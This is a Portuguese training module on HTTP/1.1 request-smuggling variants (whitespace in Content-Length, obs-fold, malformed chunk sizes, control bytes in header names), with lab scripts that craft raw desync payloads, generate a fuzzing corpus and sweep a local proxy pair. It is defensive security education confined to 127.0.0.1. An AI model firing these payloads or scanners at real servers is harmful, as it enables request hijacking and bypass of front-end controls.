# Módulo 4 — Outras Variantes de H1

**Carga:** 3 horas (1h teoria · 2h lab)
**Pré-requisitos:** Módulo 3

---

## Objetivos

1. Conhecer as variantes que **não** são TE/CL — e onde cada uma discorda.
2. Entender o **obs-fold** e a **continuação de header** como superfície.
3. Reconhecer o **chunk malformado** como variante.
4. Saber onde o **CRLF** no header vira entrada.
5. Aplicar a **tabela de variantes** a um alvo novo.

---

## ⚠ Antes de começar

⚠ **A afirmação que organiza o módulo:**

> **O TE/CL é a família famosa. Mas a discordância não precisa de dois headers** — **basta uma
> forma que um parser aceita e o outro não.**

⚠ **E a razão de isso ser um módulo inteiro:** **cada variante é um **detalhe de parsing** que
alguém tolerou** — **e a tolerância de um não é a do outro.**

⚠ **A tese:**

> **Onde a spec diz "rejeite", as implementações divergem entre tolerar e não tolerar.** **E cada
> tolerância é uma variante.**

⚠ **A tabela das variantes deste módulo:**

| # | Variante | Onde a discordância está |
|---|---|---|
| 1 | **TE ofuscado** | A forma do header |
| 2 | **Espaço no header** | ⚠ `Content-Length : 6` |
| 3 | **Obs-fold** | A linha de continuação |
| 4 | **Chunk malformado** | O tamanho do chunk |
| 5 | **CRLF no nome** | O que o header aceita |
| 6 | **Whitespace no valor** | ⚠ `6 ` vs `6` |

⚠ **A linha 6 é a mais simples de todas e rende.** **`Content-Length: 6 `** — **com espaço no
fim** — **é inválido, e alguns parsers o aceitam e outros não.** **É a mesma divergência, num
byte.**

---

## 4.1 O espaço: o byte que quase todos toleram

⚠ **A variante mais simples do curso. E a mais subestimada.**

| Forma | Válido? | ⚠ Quem tolera |
|---|---|---|
| `Content-Length: 6` | ✓ | Todos |
| `Content-Length: 6 ` (espaço no fim) | ✗ | ⚠ Muitos |
| `Content-Length : 6` (espaço antes do `:`) | ✗ | ⚠ Alguns |
| `Content-Length:\t6` (tab) | ✗ | ⚠ Muitos |
| `Content-Length:  6` (dois espaços) | ✗ | ⚠ Muitos |
| ` Content-Length: 6` (espaço no início) | ✗ | ⚠ Poucos |

⚠ **A tabela é o instrumento.** **Cada linha é uma variante em potencial** — **e o teste é
combinar duas camadas e ver quem tolera o quê.**

⚠ **E a linha 2 é a mais comum.** **Espaço no **fim** do valor** — **e é onde o parser de um lê `6`
e o do outro lê `6 `.** **E se um deles falha em converter, ele usa 0.**

⚠ **A tabela de combinação — e ela é o método:**

```
┌──────────────────────────┬──────────────┬──────────────┬────────────┐
│ FORMA                    │ FRONTEND     │ BACKEND      │ DISCORDAM? │
├──────────────────────────┼──────────────┼──────────────┼────────────┤
│ Content-Length: 6        │ 6            │ 6            │ não        │
│ Content-Length: 6␣       │ 6            │ 0 (falha)    │ ⚠ SIM       │
│ Content-Length : 6       │ 6            │ ignora       │ ⚠ SIM       │
│ Content-Length:␣␣6       │ 6            │ 6            │ não        │
└──────────────────────────┴──────────────┴──────────────┴────────────┘
```

⚠ **A segunda e a terceira linhas são as variantes.** **E o efeito é o mesmo:** **um lê um `CL`, o
outro não o reconhece** — **e o backend trata como se não houvesse corpo.**

⚠ **A regra escrita:**

> **Um byte de diferença é suficiente.** **A variante é o par (forma, tolerância) — e há muitas
> combinações.**

```bash
mkdir -p ~/smuggle-lab/mod04 && cd ~/smuggle-lab/mod04

echo "═══ 1. o espaço ═══"
echo
cat > espaco.md <<'EOF'
# O espaço — a variante mais simples

| Forma | Válido? | Quem tolera |
|---|---|---|
| `Content-Length: 6` | ✓ | todos |
| ⚠ `Content-Length: 6 ` (espaço no fim) | ✗ | MUITOS |
| ⚠ `Content-Length : 6` (antes do :) | ✗ | alguns |
| `Content-Length:\t6` (tab) | ✗ | muitos |
| `Content-Length:  6` (dois espaços) | ✗ | muitos |
| ` Content-Length: 6` (no início) | ✗ | poucos |

## A tabela de combinação
| Forma | Frontend | Backend | Discordam? |
|---|---|---|---|
| `Content-Length: 6` | 6 | 6 | não |
| ⚠ `Content-Length: 6 ` | 6 | 0 (falha) | ⚠ SIM |
| ⚠ `Content-Length : 6` | 6 | ignora | ⚠ SIM |
| `Content-Length:  6` | 6 | 6 | não |

## ⚠ o efeito
um lê um CL, o outro não o reconhece.
e o backend trata como se NÃO HOUVESSE CORPO.
✓ e o corpo declarado vira a PRÓXIMA requisição.

## ⚠ A REGRA
um byte de diferença é suficiente.
a variante é o par (FORMA, TOLERÂNCIA) — e há muitas combinações.
EOF

cat espaco.md

echo
echo "═══ 2. o obs-fold — a continuação de header ═══"
echo
cat <<'EXPL'
  ── O QUE É ──
     em HTTP/1.0 (e nas primeiras versões), um header
     podia CONTINUAR na linha seguinte, se a linha
     começasse com espaço ou tab:

        Transfer-Encoding: chunked\r\n
        \t\r\n                      ← ⚠ continuação (linha vazia + tab)

     ⚠ e a RFC 7230 DEPRECOU isso.
        a 9112 diz: ⚠ REJEITAR.

  ── POR QUE É VARIANTE ──
     · um parser antigo ACEITA a continuação → "chunked"
     · um parser novo REJEITA a linha         → header inválido
     ⚠ e os dois leem a mesma sequência de forma diferente.

  ── E A FORMA MAIS ÚTIL ──
     Transfer-Encoding: chunked\r\n
     \t\r\n
     ⚠ o backend aceita → chunked
     ⚠ o frontend rejeita → e pode não repassar o header

  ── A VARIANTE ──
     se o frontend DESCARTA o header e o backend ACEITA,
     ⚠ o backend lê em chunks e o frontend não.
     ✓ é a mesma divergência, com a superfície no OBS-FOLD.
EXPL
```

⚠ **O obs-fold é a variante histórica, e a mais interessante conceitualmente.** **É a **deprecação**
da spec que cria a divergência** — **parsers antigos aceitam, novos rejeitam.**

⚠ **E a forma com `\t\r\n` é a mais útil:** **o header tem uma continuação **vazia** — **e o valor
se mantém.** **Um lado aceita, o outro descarta.**

**Produza `espaco.md`:**

| Forma | Válido? | Quem tolera |
|---|---|---|
| `Content-Length: 6` | | |
| `Content-Length: 6 ` | | |
| `Content-Length : 6` | | |

**Responda:**

1. **Qual forma é a mais comum** de divergir?
2. **O que acontece quando um parser não converte** o valor?
3. **O que é obs-fold?** Por que é variante?
4. **O que a 9112 diz sobre obs-fold?**

---

## 4.2 O chunk malformado

⚠ **A variante cujo campo não é o header — é o **tamanho do chunk**.**

| Forma | Válido? | ⚠ A discordância |
|---|---|---|
| `5\r\n` | ✓ | — |
| `5 ;ext\r\n` | ✓ (extensão) | ⚠ Extensão ignorada |
| `05\r\n` | ⚠ Ambíguo | Zero à esquerda |
| `5 \r\n` | ✗ | ⚠ Espaço |
| `+5\r\n` | ✗ | ⚠ Sinal |
| `0x5\r\n` | ✗ | ⚠ Hex explícito |
| `5e2\r\n` | ✗ | ⚠ Notação científica? |
| ⚠ `FFFFFFFF\r\n` | ✗ | ⚠ **Overflow** |

⚠ **A última linha é a mais interessante.** **Um tamanho de chunk gigante** — **e um parser que
estoura, outro que rejeita.** **É a variante de overflow no chunk.**

⚠ **E a tabela das extensões de chunk:**

| Forma | O que faz | ⚠ A divergência |
|---|---|---|
| `5;ext=val\r\n` | Extensão | Um ignora, outro valida |
| `5 ;ext\r\n` | ⚠ **Espaço antes do `;`** | Um aceita, outro não |
| `5;ext\r\n` | Extensão sem valor | Idem |

⚠ **A linha do espaço antes do `;` é a mesma do `Transfer-Encoding :`** — **um espaço onde a spec
não o permite.** **E a tolerância diverge.**

⚠ **A regra escrita:**

> **O chunk tem uma gramática, e a gramática tem cantos.** **Onde a spec é precisa e o parser é
> tolerante, há uma variante.**

```bash
cd ~/smuggle-lab/mod04

echo "═══ 3. o chunk malformado ═══"
echo
cat > chunk.md <<'EOF'
# O chunk malformado

| Forma | Válido? | A discordância |
|---|---|---|
| `5\r\n` | ✓ | — |
| `5 ;ext\r\n` | ✓ | extensão ignorada |
| `05\r\n` | ambíguo | zero à esquerda |
| `5 \r\n` | ✗ | espaço |
| `+5\r\n` | ✗ | sinal |
| `0x5\r\n` | ✗ | hex explícito |
| `5e2\r\n` | ✗ | notação científica? |
| ⚠ `FFFFFFFF\r\n` | ✗ | ⚠ **OVERFLOW** |

## As extensões
| Forma | O que faz | A divergência |
|---|---|---|
| `5;ext=val\r\n` | extensão | um ignora, outro valida |
| ⚠ `5 ;ext\r\n` | espaço antes do `;` | um aceita, outro não |
| `5;ext\r\n` | sem valor | idem |

## ⚠ o overflow
um tamanho GIGANTE de chunk.
um parser estoura, outro rejeita.
✓ é a variante de overflow no parser.

## ⚠ A REGRA
o chunk tem uma GRAMÁTICA, e a gramática tem cantos.
onde a spec é PRECISA e o parser é TOLERANTE, há uma variante.
EOF

cat chunk.md

echo
echo "═══ 4. o CRLF no nome do header ═══"
echo
cat <<'EXPL'
  ── A SUPERFÍCIE ──
     o que o parser aceita no NOME do header?

        Content-Length: 6           ← normal
        Content-Length\r: 6         ← ⚠ CR no nome
        Content\u000bLength: 6      ← ⚠ vertical tab
        Content-Len\x00gth: 6       ← ⚠ NUL

     ⚠ e a spec diz: só "token" characters.

  ── POR QUE É VARIANTE ──
     · um parser VALIDA o nome e rejeita
     · outro ⚠ NORMALIZA e aceita
     ⚠ e os dois veem o mesmo header de forma diferente.

  ── E O EFEITO ──
     se o frontend ACEITA "Content-Length\r" como CL,
     e o backend NÃO (ele vê um header desconhecido),
     ⚠ a discordância está montada.

  ── E A FORMA MAIS INTERESSANTE ──
     um header que o frontend vê como dois,
     e o backend vê como um.
     ✓ a contagem de headers diverge.
EXPL
```

⚠ **O CRLF no nome é a variante mais esotérica — e a mais moderna.** **Ela explora o que o parser
**aceita** no nome** — **e a validação diverge.**

⚠ **E a última nota é a chave:** **um header pode ser contado como **dois** por um lado e **um** pelo
outro** — **e a contagem divergente é a discordância.**

**Produza `chunk.md`:**

| Forma | Válido? | Discordância |
|---|---|---|
| `5 ;ext` | | |
| `+5` | | |
| `FFFFFFFF` | | |

**Responda:**

1. **Qual forma de chunk rende mais?** Por quê?
2. **O que o overflow no chunk explora?**
3. **O que o CRLF no nome explora?**
4. **Como a contagem de headers pode divergir?**

---

## 4.3 A tabela de variantes

⚠ **O instrumento do módulo: a tabela que você aplica a um alvo novo.**

| # | Variante | Forma | Onde testar |
|---|---|---|---|
| 1 | CL.TE | `CL` menor + `TE` | Módulo 3 |
| 2 | TE.CL | `CL` mente, chunk certo | Módulo 3 |
| 3 | TE.TE | dois `TE`, um ofuscado | Módulo 3 |
| 4 | CL.CL | dois `CL` | Módulo 3 |
| 5 | CL.0 | um `CL`, backend ignora | Módulo 3 |
| 6 | **Espaço no valor** | `CL: 6 ` | ⚠ **Comece aqui** |
| 7 | **Espaço antes do `:`** | `CL : 6` | ⚠ Comece aqui |
| 8 | **Obs-fold** | continuação com tab | Este módulo |
| 9 | **Chunk malformado** | `5 ;ext` | Este módulo |
| 10 | **CRLF no nome** | `Content-Length\r:` | Este módulo |
| 11 | **H2 → H1** | ⚠ **conversão** | Módulo 6 |
| 12 | **Client-side** | o navegador | Módulo 7 |

⚠ **A ordem de teste importa, e é econômica.** **As variantes 6 e 7 são as mais fáceis de testar e
frequentemente funcionam** — **e custam um byte.** **Você começa por elas.**

⚠ **E a tabela é o que você leva para um alvo novo.** **Não é a lista de bugs conhecidos; é o
**espaço de busca**.

⚠ **A tabela do que precede cada variante:**

| Variante | Precisa de |
|---|---|
| CL.TE / TE.CL | Dois headers |
| TE.TE | Dois `TE`, um ofuscado |
| CL.CL | Dois `CL` |
| CL.0 | ⚠ Backend que ignora o corpo |
| Espaço | ⚠ Nada — um byte |
| Obs-fold | ⚠ Parser antigo |
| H2→H1 | ⚠ **Conversão de protocolo** |
| Client-side | ⚠ **Navegador** |

⚠ **A regra escrita:**

> **A variante 6 precisa de nada.** **Antes de procurar um bug complexo, teste se o parser aceita
> um espaço.**

```bash
cd ~/smuggle-lab/mod04

echo "═══ 5. a tabela de variantes ═══"
echo
cat > tabela-variantes.md <<'EOF'
# A tabela de variantes

| # | Variante | Forma | Precisa de | Onde |
|---|---|---|---|---|
| 1 | CL.TE | CL menor + TE | dois headers | módulo 3 |
| 2 | TE.CL | CL mente | dois headers | módulo 3 |
| 3 | TE.TE | dois TE ofuscados | dois TE | módulo 3 |
| 4 | CL.CL | dois CL | dois CL | módulo 3 |
| 5 | CL.0 | um CL, backend ignora | backend que não lê | módulo 3 |
| 6 | ⚠ ESPAÇO no valor | `CL: 6 ` | ⚠ NADA | este módulo |
| 7 | ⚠ ESPAÇO antes do `:` | `CL : 6` | ⚠ NADA | este módulo |
| 8 | OBS-FOLD | continuação + tab | parser antigo | este módulo |
| 9 | CHUNK malformado | `5 ;ext` | parser tolerante | este módulo |
| 10 | CRLF no nome | `Content-Length\r:` | validação frouxa | este módulo |
| 11 | H2 → H1 | conversão | proxy que converte | módulo 6 |
| 12 | CLIENT-SIDE | o navegador | ⚠ navegador | módulo 7 |

## ⚠ a ordem econômica
as variantes 6 e 7 são as mais FÁCEIS de testar
e frequentemente funcionam.
✓ e custam UM BYTE.
→ comece por elas.

## ⚠ o que a tabela é
não é a lista de bugs conhecidos.
é o ESPAÇO DE BUSCA.
✓ você a leva para um alvo novo.
EOF

cat tabela-variantes.md

echo
echo "═══ 6. e o medidor das variantes de forma ═══"
echo
cat > mede-formas.py <<'PY'
#!/usr/bin/env python3
"""
mede-formas.py — testa as variantes de FORMA (espaço, obs-fold, chunk).

⚠ DIDÁTICO e LOCAL (127.0.0.1).
"""
import socket, sys, os, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = sys.argv[2] if len(sys.argv) > 2 else os.path.expanduser(
    "~/smuggle-lab/evidencia/backend-cl.log")

CASOS = [
    ("espaco no valor", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6 \r\n"
                        b"\r\nAAAAAAGET /f1 HTTP/1.1\r\nHost: l\r\n\r\n", "f1"),
    ("espaco antes do :", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length : 6\r\n"
                          b"\r\nAAAAAAGET /f2 HTTP/1.1\r\nHost: l\r\n\r\n", "f2"),
    ("obs-fold", b"POST / HTTP/1.1\r\nHost: l\r\nTransfer-Encoding: chunked\r\n"
                 b"\t\r\n0\r\n\r\nGET /f3 HTTP/1.1\r\nHost: l\r\n\r\n", "f3"),
    ("chunk com espaco", b"POST / HTTP/1.1\r\nHost: l\r\nTransfer-Encoding: chunked\r\n"
                         b"\r\n6 ;x\r\nAAAAAA\r\n0\r\n\r\nGET /f4 HTTP/1.1\r\nHost: l\r\n\r\n", "f4"),
    ("dois espacos", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length:  6\r\n"
                     b"\r\nAAAAAAGET /f5 HTTP/1.1\r\nHost: l\r\n\r\n", "f5"),
]


def conta():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def manda(p: bytes) -> int:
    antes, _ = conta()
    try:
        with socket.create_connection((HOST, PORT), timeout=6) as s:
            s.sendall(p)
            s.settimeout(3)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
            except socket.timeout:
                pass
    except Exception:
        return 0
    time.sleep(0.4)
    depois, _ = conta()
    return depois - antes


def main():
    print("═══ VARIANTES DE FORMA ═══")
    print()
    print(f"  alvo: {HOST}:{PORT}  ⚠ LOCAL")
    print(f"  log : {LOG}")
    print()
    print(f"  {'variante':<22} {'req.':<8} {'escondido?':<14}")
    print("  " + "-"*46)
    for nome, payload, marca in CASOS:
        n = manda(payload)
        _, log = conta()
        ap = "⚠⚠ SIM" if marca in log else "não"
        print(f"  {nome:<22} {n:<8} {ap:<14}")
    print()
    print("  ⚠ cada linha testa UM BYTE de diferença.")
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x mede-formas.py
echo "  ── pronto ──"
echo "     python3 ~/smuggle-lab/mod04/mede-formas.py 8081"
```

⚠ **O medidor testa cinco formas de uma vez.** **E note os nomes:** **`f1` a `f5`** — **as strings
que aparecem no log se o desync ocorrer.**

⚠ **E a nota final é o argumento do módulo:** **cada linha testa **um byte** de diferença.** **E
custa nada.**

**Produza `tabela-variantes.md`:**

| # | Variante | Precisa de |
|---|---|---|
| 6 | Espaço no valor | |
| 8 | Obs-fold | |
| 10 | CRLF no nome | |

**Responda:**

1. **Quais variantes custam um byte?**
2. **Qual a mais fácil de testar?** Por quê?
3. **O que a tabela é** — lista de bugs ou espaço de busca?
4. **Quantas formas deram desync** no seu lab?

---

## 4.4 LAB — As variantes de forma

**Duração:** 120 min

### Passo 1 — Teste as formas (50 min)

```bash
cd ~/smuggle-lab

echo "═══ TESTANDO AS FORMAS ═══"
echo
cat <<'EXPL'
  ── COM O PAR DO MÓDULO 3 NO AR ──
     frontend (TE) :8081  →  backend (CL) :8090

     1. rode o medidor das formas:
        python3 ~/smuggle-lab/mod04/mede-formas.py 8081

     2. ⚠ e acompanhe o log:
        tail -f ~/smuggle-lab/evidencia/backend-cl.log

  ── O QUE OBSERVAR ──
     · quantas requisições o backend conta
     · se a string f1..f5 aparece
     ⚠ e se alguma forma foi REJEITADA (o frontend respondeu 400)
EXPL

mkdir -p ~/smuggle-lab/evidencia
cat > ~/smuggle-lab/evidencia/formas.md <<'EOF'
# As variantes de forma

## O par
| Camada | Regra | Porta |
|---|---|---|
| frontend | | |
| backend | | |

## Os resultados
| # | Forma | Req. novas | ⚠ Desync? | Rejeitado? |
|---|---|---|---|---|
| 1 | espaço no valor | | | |
| 2 | espaço antes do : | | | |
| 3 | obs-fold | | | |
| 4 | chunk com espaço | | | |
| 5 | dois espaços | | | |

## ⚠ a que funcionou
| Item | Valor |
|---|---|
| Qual | |
| Por que | |
| O payload (bytes literais) | |

## A evidência literal
```
[frontend]
```
```
[backend]
```

## O que isso ensina
| Item | Valor |
|---|---|
| quantos bytes custou | ⚠ um |
| a spec exige? | |
| a tolerância é do frontend ou do backend? | |
EOF

cat ~/smuggle-lab/evidencia/formas.md
```

⚠ **A ficha pede a coluna "rejeitado?"** — **porque a rejeição é resultado.** **Um frontend que
rejeita a forma é imune àquela variante.**

⚠ **E a pergunta "a tolerância é de quem?" é a análise.** **Você precisa saber qual dos dois tolera**
— **porque é isso que determina a direção do desync.**

**Produza `formas-testadas.md`:**

| # | Forma | Desync? | Rejeitado? |
|---|---|---|---|
| 1 | Espaço no valor | | |
| 2 | Espaço antes do `:` | | |
| 3 | Obs-fold | | |
| 5 | Dois espaços | | |

**Responda:**

1. **Quantas formas deram desync?**
2. **Alguma foi rejeitada?** Qual?
3. **Quantos bytes custa a variante vencedora?**
4. **A tolerância é do frontend ou do backend?**

### Passo 2 — Amplie o espaço de busca (40 min)

⚠ **Agora você **gera** as variantes, em vez de testá-las uma a uma.**

```bash
cd ~/smuggle-lab/mod04

echo "═══ GERANDO O ESPAÇO DE BUSCA ═══"
echo
cat > gera-variantes.py <<'PY'
#!/usr/bin/env python3
"""
gera-variantes.py — gera as variantes de FORMA sistematicamente.

⚠ não testa nada. GERA o corpus (Parser Differentials, módulo 5).
   e você o roda com o harness.
"""
import sys

# ─── as dimensões da variação ───
NOMES = ["Content-Length", "Content-Length ", "Content-Length\t",
         "Content-Length :", " Content-Length", "Content-Length\r"]
VALORES = ["6", "6 ", " 6", "6\t", "06", "+6", "6 ", "0x6"]

# ─── o corpo que contém o pedido escondido ───
MARCA = "GEN"
CORPO = f"AAAAAAGET /{MARCA} HTTP/1.1\r\nHost: l\r\n\r\n".encode()


def gera():
    casos = []
    for nome in NOMES:
        for valor in VALORES:
            header = f"{nome}: {valor}\r\n".encode()
            payload = (b"POST / HTTP/1.1\r\nHost: l\r\n" + header + b"\r\n" + CORPO)
            rotulo = f"nome={nome!r} valor={valor!r}"
            casos.append((rotulo, payload))
    return casos


def main():
    casos = gera()
    print("═══ ESPAÇO DE BUSCA — variantes de forma ═══")
    print()
    print(f"  nomes   : {len(NOMES)}")
    print(f"  valores : {len(VALORES)}")
    print(f"  ⚠ total : {len(casos)} combinações")
    print()
    print("  ── o corpus gerado ──")
    for i, (rotulo, payload) in enumerate(casos[:12], 1):
        print(f"     {i:>3}. {rotulo:<44} {len(payload)}B")
    print(f"     ... e mais {max(0, len(casos)-12)}")
    print()
    print("  ⚠ cada um é um caso do corpus — um por PONTO de divergência.")
    print("     e o harness (Parser Differentials, módulo 5) os roda.")
    print()
    print("  ✓ escreva-os em arquivo e rode:")
    print("     python3 gera-variantes.py > corpus/formas.txt")


if __name__ == "__main__":
    main()
PY

chmod +x gera-variantes.py
python3 gera-variantes.py

echo
echo "═══ E O HARNESS QUE OS RODA ═══"
cat > harness/roda-variantes.py <<'PY'
#!/usr/bin/env python3
"""
roda-variantes.py — roda N variantes de forma e reporta as DISCORDÂNCIAS.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
   ele NÃO conclui — dá a lista de candidatos (Parser Differentials, módulo 5).
"""
import socket, sys, os, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = os.path.expanduser("~/smuggle-lab/evidencia/backend-cl.log")

NOMES = ["Content-Length", "Content-Length ", "Content-Length :", " Content-Length"]
VALORES = ["6", "6 ", " 6", "06"]


def conta():
    try:
        with open(LOG) as f:
            return f.read().count("═══ requisição #")
    except FileNotFoundError:
        return 0


def manda(p: bytes) -> bool:
    """retorna True se o proxy respondeu com erro (rejeitou)"""
    try:
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            s.sendall(p)
            s.settimeout(2)
            try:
                r = s.recv(4096)
                return r.startswith(b"HTTP/1.1 4") or r.startswith(b"HTTP/1.1 5")
            except socket.timeout:
                return False
    except Exception:
        return True


def main():
    print("═══ VARIANTES DE FORMA — VARREDURA ═══")
    print()
    print(f"  alvo: {HOST}:{PORT}   ⚠ LOCAL")
    print()
    print(f"  {'nome':<20} {'valor':<8} {'req.':<6} {'rejeitou?':<12}")
    print("  " + "-"*50)

    candidatos = []
    for nome in NOMES:
        for valor in VALORES:
            h = f"{nome}: {valor}\r\n".encode()
            p = b"POST / HTTP/1.1\r\nHost: l\r\n" + h + b"\r\nAAA"
            antes = conta()
            rej = manda(p)
            time.sleep(0.15)
            depois = conta()
            n = depois - antes
            if not rej and n != 1:
                candidatos.append((nome, valor, n))
            print(f"  {nome!r:<20} {valor!r:<8} {n:<6} {'⚠ SIM' if rej else 'não':<12}")

    print()
    print(f"  ⚠ candidatos (o backend não viu exatamente 1): {len(candidatos)}")
    for nome, valor, n in candidatos:
        print(f"     · {nome!r} + {valor!r} → {n} requisições")
    print()
    print("  ⚠ isto NÃO é a lista de bugs. é a lista de CANDIDATOS.")
    print("     ✓ a classificação é o seu trabalho.")
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x harness/roda-variantes.py
echo "  ── pronto ──"
echo "     python3 ~/smuggle-lab/harness/roda-variantes.py 8081"
```

⚠ **O gerador e o harness são os do Parser Differentials, aplicados aqui.** **E a nota do gerador é
o ponto:** **gerar o **espaço de busca** é diferente de testar um payload.**

⚠ **E o harness reporta candidatos** — **não conclusões.** **É a mesma divisão de sempre.**

**Produza `espaco-busca.md`:**

| Dimensão | Valores | Total |
|---|---|---|
| Nomes | | |
| Valores | | |
| **Combinações** | | |

**Responda:**

1. **Quantas combinações o gerador produziu?**
2. **Quantos candidatos o harness achou?**
3. **O harness conclui?** Ou dá candidatos?
4. **Por que gerar o espaço é diferente** de testar um payload?

### Passo 3 — Registre e classifique (30 min)

Produza `caderno/PD-004.md`:

```markdown
# PD-004 — variantes de forma

**Data:** ____

## 1. O par
| Camada | Regra | Porta |
|---|---|---|
| frontend | | |
| backend | | |

## 2. As formas testadas
| # | Forma | Req. | Rejeitado? | ⚠ Candidato? |
|---|---|---|---|---|
| 1 | espaço no valor | | | |
| 2 | espaço antes do : | | | |
| 3 | obs-fold | | | |
| 4 | chunk com espaço | | | |
| 5 | dois espaços | | | |

## 3. O espaço de busca gerado
| Item | Valor |
|---|---|
| nomes | |
| valores | |
| ⚠ combinações | |
| candidatos encontrados | |

## 4. Os candidatos
| # | Combinação | O que o backend viu | ⚠ Por quê |
|---|---|---|---|
| 1 | | | |
| 2 | | | |

## 5. A classificação (Parser Differentials, módulo 3)
| # | Q1 spec decide? | Q2 as duas seguem? | Categoria |
|---|---|---|---|
| 1 | | | |

## 6. A evidência literal
```
[frontend]
```
```
[backend]
```

## 7. ⚠ O que eu NÃO fiz
- [ ] não apontei para serviço de terceiro
- [ ] não testei em produção
- [ ] não usei o desync para acessar nada
- [ ] não publiquei nada

## 8. O que NÃO foi verificado
⚠ mínimo 3

## 9. O que isso destrava
| # | Próxima variante | Prioridade |
```

**Produza `registro-formas.md`:**

| Item | Valor |
|---|---|
| Formas testadas | |
| Candidatos | |
| Categoria | |
| O que não fiz | |

**Responda:**

1. **Quantos candidatos você encontrou?**
2. **Qual a categoria?**
3. **Qual a próxima variante** você testaria?
4. **O que não foi verificado?**

### Critérios de aceitação

- `espaco.md` com as **seis** formas e quem tolera cada.
- Você explicou **por que um byte é suficiente**.
- Você explicou **o que acontece quando um parser não converte** o valor.
- Você explicou **o que é obs-fold** e por que é variante.
- Você explicou **o que a 9112 diz** sobre obs-fold.
- `chunk.md` com as **oito** formas de chunk.
- Você explicou **o que o overflow no chunk** explora.
- Você explicou **o que o CRLF no nome** explora.
- Você explicou **como a contagem de headers pode divergir**.
- `tabela-variantes.md` com as **12** variantes e o que cada uma precisa.
- Você explicou **por que as variantes 6 e 7 vêm primeiro**.
- Você explicou **o que a tabela é** — espaço de busca, não lista de bugs.
- As **cinco formas** testadas, com a coluna "rejeitado?".
- Você identificou **qual forma deu desync**.
- Você explicou **de quem é a tolerância**.
- `gera-variantes.py` produzindo o **espaço de busca**.
- Você mediu o **número de combinações**.
- `harness/roda-variantes.py` reportando **candidatos**.
- Você explicou **por que o harness não conclui**.
- `caderno/PD-004.md` com as **nove** seções.
- ⚠ **Nenhum serviço de terceiro.**

---

## Avaliação

1. **Por que a discordância não precisa de dois headers?**
2. **Cite seis formas de espaço** e quem tolera cada.
3. **Por que um byte é suficiente?**
4. **O que acontece quando um parser não converte** o `Content-Length`?
5. **O que é obs-fold?**
6. **O que a 9112 diz** sobre ele?
7. **Por que obs-fold é uma variante?**
8. **Cite cinco formas de chunk** e a discordância de cada.
9. **O que o overflow no chunk explora?**
10. **O que o espaço antes do `;` tem em comum** com o espaço antes do `:`?
11. **O que o CRLF no nome explora?**
12. **Como a contagem de headers pode divergir?**
13. **Cite as 12 variantes** da tabela.
14. **Quais precisam de nada?** Por que vêm primeiro?
15. **Quais precisam de conversão de protocolo?**
16. **O que a tabela é** — lista de bugs ou espaço de busca?
17. **Por que gerar o espaço é diferente** de testar um payload?
18. **O que o harness de variantes reporta?**
19. **Por que a rejeição é resultado?**
20. **De quem é a tolerância**, e por que isso importa?

---

**Próximo:** [Módulo 5 — O lab e o harness de desync](modulo-05.md)
